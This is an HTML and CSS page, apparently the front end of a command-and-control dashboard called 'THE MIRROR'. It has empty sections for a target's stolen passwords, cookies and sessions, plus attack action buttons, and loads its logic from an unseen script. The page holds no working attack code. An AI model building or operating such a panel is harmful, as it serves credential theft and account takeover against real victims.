<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>THE MIRROR - C2 Dashboard</title>
  <style>
    :root {
      --bg: #0a0a0f;
      --card-bg: #14141f;
      --border: #2a2a3a;
      --text: #e0e0e0;
      --text-dim: #8888aa;
      --accent: #00ff88;
      --danger: #ff4444;
      --warning: #ffaa00;
      --success: #00cc66;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background: var(--bg);
      color: var(--text);
      font-family: "Courier New", monospace;
      padding: 20px;
    }

    .header {
      text-align: center;
      padding: 30px 0;
      border-bottom: 2px solid var(--border);
      margin-bottom: 30px;
    }

    .header h1 {
      font-size: 2.5em;
      color: var(--accent);
      letter-spacing: 5px;
      text-shadow: 0 0 20px var(--accent);
    }

    .header .status {
      margin-top: 10px;
      font-size: 1.2em;
      color: var(--success);
    }

    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }

    .stat-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      text-align: center;
    }

    .stat-label {
      font-size: 0.9em;
      color: var(--text-dim);
      margin-bottom: 10px;
    }

    .stat-value {
      font-size: 2em;
      color: var(--accent);
    }

    .target-info {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      margin-bottom: 30px;
    }

    .target-info h3 {
      color: var(--accent);
      margin-bottom: 15px;
    }

    .target-info table {
      width: 100%;
    }

    .target-info td {
      padding: 8px;
      border-bottom: 1px solid var(--border);
    }

    .target-info td:first-child {
      color: var(--text-dim);
      width: 150px;
    }

    .data-table {
      width: 100%;
      border-collapse: collapse;
      margin-bottom: 30px;
    }

    .data-table th {
      background: var(--card-bg);
      color: var(--accent);
      padding: 12px;
      text-align: left;
      border-bottom: 2px solid var(--border);
    }

    .data-table td {
      padding: 10px 12px;
      border-bottom: 1px solid var(--border);
    }

    .password-cell {
      color: var(--warning);
      word-break: break-all;
    }

    .valid-badge {
      color: var(--success);
      font-weight: bold;
    }

    .action-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 15px;
    }

    .action-btn {
      padding: 20px;
      border: 2px solid var(--danger);
      background: transparent;
      color: var(--danger);
      font-family: "Courier New", monospace;
      font-size: 1em;
      cursor: pointer;
      border-radius: 10px;
      transition: all 0.3s;
    }

    .action-btn:hover {
      background: var(--danger);
      color: white;
      box-shadow: 0 0 20px var(--danger);
    }

    .action-btn.success {
      border-color: var(--success);
      color: var(--success);
    }

    .action-btn.success:hover {
      background: var(--success);
      color: white;
      box-shadow: 0 0 20px var(--success);
    }

    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      padding: 15px 25px;
      border-radius: 10px;
      font-weight: bold;
      z-index: 1000;
      animation: slideIn 0.3s ease;
    }

    .notification.danger { background: var(--danger); color: white; }
    .notification.success { background: var(--success); color: white; }
    .notification.warning { background: var(--warning); color: black; }

    @keyframes slideIn {
      from { transform: translateX(100%); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }

    .empty-state {
      text-align: center;
      padding: 50px;
      color: var(--text-dim);
    }
  </style>
</head>
<body>
  <div class="header">
    <h1>THE MIRROR</h1>
    <div class="status">● SYSTEM ACTIVE — TARGET ONLINE</div>
  </div>

  <section id="overview"></section>
  <section id="passwords"></section>
  <section id="cookies"></section>
  <section id="sessions"></section>
  <section id="actions"></section>

  <script src="dashboard.js"></script>
</body>
</html>
